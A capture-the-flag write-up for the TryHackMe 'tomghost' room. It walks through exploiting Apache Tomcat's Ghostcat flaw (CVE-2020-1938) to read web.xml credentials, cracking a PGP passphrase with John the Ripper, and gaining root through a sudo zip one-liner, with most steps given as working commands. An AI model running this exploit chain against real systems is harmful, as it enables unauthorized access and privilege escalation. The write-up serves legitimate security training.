---

Name: tomghost
Difficulty: Easy
URL: https://tryhackme.com/room/tomghost
Description: Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

---

## Enumeration

I started with a full port scan:

```bash
$ rustscan -a tom.thm -r 1-65535 --ulimit 5000 -- -sC -sV

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped syn-ack
8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       syn-ack Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The interesting ports are **8009** and **8080**. Port 8080 is running Apache Tomcat 9.0.30, while port 8009 is running the AJP protocol.

## Exploiting Ghostcat

Tomcat 9.0.30 is vulnerable to **CVE-2020-1938**, also known as Ghostcat.

I first found a public exploit for the vulnerability:

https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat

However, running it resulted in a Python compatibility error:

```bash
$ python3 exploit.py tom.thm -p 8009 -f WEB-INF/web.xml

Traceback (most recent call last):
  File "/tmp/exploit.py", line 294, in <module>
    t = Tomcat(args.target, args.port)
  File "/tmp/exploit.py", line 261, in __init__
    self.stream = self.socket.makefile("rb", bufsize=0)
TypeError: socket.makefile() got an unexpected keyword argument 'bufsize'
```

I also found the exploit through `searchsploit`:

```bash
$ ./searchsploit Ghostcat

---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                 | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                   | multiple/webapps/49039.rb
---------------------------------------------------------------------------------- ---------------------------------
```

The Exploit-DB Python exploit produced the same compatibility error:

```bash
$ python3 48143.py tom.thm -p 8009 -f /etc/passwd

Traceback (most recent call last):
  File "/tmp/48143.py", line 295, in <module>
    t = Tomcat(args.target, args.port)
  File "/tmp/48143.py", line 262, in __init__
    self.stream = self.socket.makefile("rb", bufsize=0)
TypeError: socket.makefile() got an unexpected keyword argument 'bufsize'
```

Since both Python exploits were incompatible with my Python version, I used another Ghostcat PoC:

```bash
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
cd Ghostcat-CNVD-2020-10487
```

I used it to read `WEB-INF/web.xml` through the AJP service:

```bash
$ python3 ajpShooter.py http://tom.thm:8080 8009 /WEB-INF/web.xml read
```

The response contained:

```xml
<description>
   Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
</description>
```

This gives us credentials:

```text
skyfuck:8730281lkjlkjdqlksalks
```

## SSH

Since SSH is open on port 22, I used these credentials to log in:

```bash
ssh skyfuck@tom.thm
```

Once logged in, I found two files in the home directory:

```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

I transferred them to my machine so I could work with them locally:

```bash
scp skyfuck@tom.thm:/home/skyfuck/credential.pgp .
scp skyfuck@tom.thm:/home/skyfuck/tryhackme.asc .
```

## Cracking the PGP Passphrase

The `.asc` file contains a PGP key protected by a passphrase. I first extracted a hash that John the Ripper could crack:

```bash
gpg2john tryhackme.asc > pgp.hash
```

I then used the RockYou wordlist:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
alexandru        (tryhackme)
```

The recovered passphrase is:

```text
alexandru
```

I could now use the PGP key to decrypt `credential.pgp`:

```bash
gpg --decrypt credential.pgp
```

This revealed another set of credentials:

```text
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

I switched to the `merlin` user:

```bash
su merlin
```

and entered the recovered password.

## Privilege Escalation

I checked Merlin's sudo permissions:

```bash
merlin@ubuntu:~$ sudo -l

Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Merlin can run `/usr/bin/zip` as root without a password.

I checked [GTFOBins](https://gtfobins.org/gtfobins/zip/#shell) and found that `zip` can be abused to execute a command as root:

```bash
sudo zip /tmp/tmp-file /etc/hosts -T -TT '/bin/sh #'
```

This gives us a root shell.
